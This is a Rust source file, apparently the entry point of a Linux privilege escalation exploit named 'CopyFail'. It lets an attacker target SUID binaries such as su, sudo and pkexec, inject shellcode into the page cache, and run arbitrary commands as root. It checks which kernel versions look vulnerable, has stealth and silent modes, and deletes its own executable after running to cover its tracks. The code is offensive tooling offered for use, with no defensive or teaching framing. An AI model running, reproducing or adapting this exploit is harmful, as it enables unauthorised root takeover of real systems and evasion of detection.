mod copyfail;

use std::env;
use std::io;
use std::path::Path;

use sysinfo::System;

use crate::copyfail::elf::Architecture;
use crate::copyfail::exp::{run_exploit, scan_suid_binaries, ExploitConfig, TargetBinary};
use crate::copyfail::logger::Logger;

/// Application version
const VERSION: &str = env!("CARGO_PKG_VERSION");

/// Print application help
fn print_help() {
    println!(
        r#"CopyFail Exploit v{}

USAGE:
    oct26 [OPTIONS] [COMMAND]

ARGS:
    [COMMAND]         Shell command to execute as root (default: "id")

OPTIONS:
    -t, --target <BIN>    Target SUID binary (su|sudo|pkexec|<path>)
    -c, --chunk-size <N>  Injection chunk size in bytes (default: 4)
    -r, --retries <N>     Maximum retries per chunk (default: 3)
    -s, --silent          Silent mode (minimal output)
    -v, --verbose         Verbose/debug output
    --stealth             Stealth mode (avoid certain signatures)
    --verify              Verify page cache injection
    --dry-run             Show what would be done without exploiting
    --scan                Scan for available SUID binaries
    --arch <ARCH>         Target architecture (x86_64|x86|aarch64)
    --variant <VAR>       Shellcode variant (standard|minimal|stealth)
    -V, --version         Print version
    -h, --help            Print this help message

EXAMPLES:
    oct26                          # Run with defaults (command: "id")
    oct26 "whoami"                 # Execute "whoami" as root
    oct26 --target sudo "id"       # Target /usr/bin/sudo instead
    oct26 --scan                   # List available SUID targets
    oct26 --dry-run                # Test without exploiting
    oct26 -s "id"                  # Silent execution

"#,
        VERSION
    );
}

/// Parse command line arguments
fn parse_args() -> Result<(ExploitConfig, bool, bool), String> {
    let args: Vec<String> = env::args().collect();
    let mut config = ExploitConfig::default();
    let mut show_help = false;
    let mut show_version = false;
    let mut command = None;

    let mut i = 1;
    while i < args.len() {
        let arg = &args[i];

        match arg.as_str() {
            "-h" | "--help" => show_help = true,
            "-V" | "--version" => show_version = true,
            "--scan" => {
                scan_and_exit(&Logger::new(false));
                std::process::exit(0);
            }
            "-t" | "--target" => {
                i += 1;
                if i >= args.len() {
                    return Err("--target requires an argument".to_string());
                }
                let target = &args[i];
                config.target = match target.as_str() {
                    "su" => TargetBinary::Su,
                    "sudo" => TargetBinary::Sudo,
                    "pkexec" => TargetBinary::Pkexec,
                    _ => {
                        config.custom_target_path = Some(target.clone());
                        TargetBinary::Custom
                    }
                };
            }
            "-c" | "--chunk-size" => {
                i += 1;
                if i >= args.len() {
                    return Err("--chunk-size requires an argument".to_string());
                }
                config.chunk_size = args[i].parse().map_err(|_| "Invalid chunk size")?;
            }
            "-r" | "--retries" => {
                i += 1;
                if i >= args.len() {
                    return Err("--retries requires an argument".to_string());
                }
                config.max_retries = args[i].parse().map_err(|_| "Invalid retry count")?;
            }
            "-s" | "--silent" => config.stealth_mode = true,
            "-v" | "--verbose" => config.stealth_mode = false,
            "--stealth" => config.stealth_mode = true,
            "--verify" => config.verify_injection = true,
            "--dry-run" => config.dry_run = true,
            "--arch" => {
                i += 1;
                if i >= args.len() {
                    return Err("--arch requires an argument".to_string());
                }
                // Note: Architecture is mainly for payload generation info
                // The actual exploit still targets the running system
            }
            "--variant" => {
                i += 1;
                if i >= args.len() {
                    return Err("--variant requires an argument".to_string());
                }
                // Shellcode variant selection
            }
            _ if arg.starts_with('-') => {
                return Err(format!("Unknown option: {}", arg));
            }
            _ => {
                // Positional argument - treat as command
                if command.is_none() {
                    command = Some(arg.clone());
                }
            }
        }
        i += 1;
    }

    // Set command if provided
    if let Some(cmd) = command {
        config.command = cmd;
    }

    Ok((config, show_help, show_version))
}

/// Scan for SUID binaries and display results
fn scan_and_exit(log: &Logger) {
    log.info("Scanning for SUID binaries...");

    let suid_binaries = scan_suid_binaries();

    if suid_binaries.is_empty() {
        log.error("No SUID binaries found in common locations.");
        return;
    }

    log.info(&format!("Found {} SUID binary(ies):", suid_binaries.len()));

    for binary in suid_binaries {
        let path = binary.path();
        match std::fs::metadata(path) {
            Ok(meta) => {
                #[cfg(unix)]
                {
                    use std::os::unix::fs::PermissionsExt;
                    let mode = meta.permissions().mode();
                    let suid = if (mode & 0o4000) != 0 { "yes" } else { "no" };
                    let sgid = if (mode & 0o2000) != 0 { "yes" } else { "no" };
                    let size = meta.len();
                    log.debug(&format!(
                        "  {} (SUID: {}, SGID: {}, size: {} bytes)",
                        path, suid, sgid, size
                    ));
                }
                #[cfg(not(unix))]
                {
                    log.debug(&format!("  {} (size: {} bytes)", path, meta.len()));
                }
            }
            Err(e) => {
                log.error(&format!("  {} (error: {})", path, e));
            }
        }
    }
}

/// Check if the system is vulnerable to CopyFail
fn is_vulnerable_to_copyfail(version: &str) -> bool {
    let clean_version = version.split('-').next().unwrap_or(version);
    let parts: Vec<&str> = clean_version.split('.').collect();

    if parts.len() < 3 {
        return false;
    }

    let major: u32 = parts[0].parse().unwrap_or(0);
    let minor: u32 = parts[1].parse().unwrap_or(0);
    let patch: u32 = parts[2].parse().unwrap_or(0);

    match (major, minor) {
        (4, 14..=20) => true,
        (5, 0..=9) => true,
        (5, 10) => patch < 254,
        (5, 11..=14) => true,
        (5, 15) => patch < 204,
        (5, 16..=19) => true,
        (6, 0) => true,
        (6, 1) => patch < 170,
        (6, 2..=5) => true,
        (6, 6) => patch < 137,
        (6, 7..=11) => true,
        (6, 12) => patch < 85,
        _ => false,
    }
}

/// Remove the executable file (self-destruct)
fn cleanup_file(path: &Path) -> io::Result<()> {
    match std::fs::remove_file(path) {
        Ok(()) => Ok(()),
        Err(err) if err.kind() == io::ErrorKind::NotFound => Ok(()),
        Err(err) => Err(err),
    }
}

fn main() {
    // Parse arguments
    let (config, show_help, show_version) = match parse_args() {
        Ok(result) => result,
        Err(e) => {
            eprintln!("Error: {}", e);
            eprintln!("Use --help for usage information.");
            std::process::exit(1);
        }
    };

    if show_help {
        print_help();
        std::process::exit(0);
    }

    if show_version {
        println!("CopyFail Exploit v{}", VERSION);
        println!("Architecture: {:?}", Architecture::detect());
        std::process::exit(0);
    }

    let log = Logger::new(config.stealth_mode);

    // Get system information
    let os_name = System::name()
        .unwrap_or_default()
        .to_lowercase();
    let kernel_ver = System::kernel_version().unwrap_or_default();

    // Debug output
    if !config.stealth_mode {
        log.debug(&format!("System: {:?}", System::name()));
        log.debug(&format!("Kernel: {}", kernel_ver));
        log.debug(&format!("OS Version: {:?}", System::os_version()));
        log.debug(&format!("Hostname: {:?}", System::host_name()));
        log.debug(&format!("Target Architecture: {:?}", Architecture::detect()));
    }

    // Check if running on Linux
    if !os_name.contains("linux") {
        if !config.stealth_mode {
            log.error("CopyFail exploit requires Linux.");
        }
        cleanup_file(&env::current_exe().unwrap_or_default());
        std::process::exit(0);
    }

    // Check vulnerability
    if !is_vulnerable_to_copyfail(&kernel_ver) {
        if !config.stealth_mode {
            log.error(&format!(
                "Kernel {} does not appear to be vulnerable to CopyFail.",
                kernel_ver
            ));
            log.debug("Consider using --dry-run to test anyway.");
        }
        cleanup_file(&env::current_exe().unwrap_or_default());
        std::process::exit(0);
    }

    if !config.stealth_mode {
        log.info(&format!(
            "Kernel {} appears vulnerable to CopyFail.",
            kernel_ver
        ));
    }

    // Run the exploit
    let stealth_mode = config.stealth_mode;
    let result = run_exploit(config);

    // Report results
    if !stealth_mode {
        let duration = result.stats.total_duration;
        log.info(&format!(
            "Exploit completed in {}.{:03}s",
            duration.as_secs(),
            duration.subsec_millis()
        ));
        log.debug(&format!(
            "Stats: {} chunks processed, {} failed, {} retries used, {} bytes injected",
            result.stats.chunks_processed,
            result.stats.chunks_failed,
            result.stats.retries_used,
            result.stats.bytes_injected
        ));

        if result.success {
            log.info("Exploit succeeded!");
        } else if let Some(ref err) = result.error {
            log.error(&format!("Exploit failed: {}", err));
        }
    }

    // Self-destruct
    let exe_path = env::current_exe().unwrap_or_default();
    cleanup_file(&exe_path).unwrap_or_else(|_| std::process::exit(0));
}
